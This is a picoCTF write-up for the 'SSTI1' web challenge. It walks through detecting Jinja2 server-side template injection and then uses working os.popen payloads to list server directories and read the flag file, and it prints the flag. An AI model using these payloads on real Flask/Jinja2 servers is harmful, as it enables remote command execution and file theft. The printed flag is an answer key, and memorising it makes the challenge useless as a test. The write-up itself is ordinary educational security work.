## SSTI1
Author: Venax

Category: Web Exploitation

Difficulty: Easy

## Description
I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.

## Solve 
**Flag:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}`

- In this challenge, since the website annouces everything we type, then we can use it to try out server side template injection attacks.
- Here, I first identified the type of template the server was using. It turned out to be `jinja2`. Payload: `{{7*'7'}}`

   jinja 

- So I searched around and found what kind of payloads we can use to list out the contents of the server. Using that, I found out that a `challenge` directory exists on the server. Payload: `{{ request.application.__globals__.__builtins__.__import__('os').popen('ls -la /').read() }}`
   
   og contents

- So once again I used the same payload with some changes to list out the contents of the `challenge` directory. Payload: `{{ request.application.__globals__.__builtins__.__import__('os').popen('ls -la /challenge').read() }}`

   challenge contents

- In that, I found the flag file. So again I modified the payload and this time used it to display the contents of the flag file to get the flag. Payload: `{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}`

   flag

## Learnings 
1. Vulnerability Confirmation: We used simple math payloads (e.g., {{ 7*7 }}) to confirm the input was being processed by a Jinja2 template engine.
2. Privilege Escalation: By observing that the RCE payload (using os.popen or subprocess.Popen) returned root for UID/GID, we confirmed the template engine was running with maximum system privileges.
3. RCE via the request Object: We learned the most reliable Jinja2 RCE chain for Flask applications: accessing the global scope via the available request object (request.application.__globals__).
4. Module Loading: We confirmed that to execute arbitrary shell commands, we must use the built-in Python function __import__('os') to load the os module.
5. Information Gathering: We used the RCE capability to pivot from template injection to filesystem exploration using Linux shell commands like ls -la / and cat /path/to/flag.

## References
1. [Server side template injection with jinja2](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)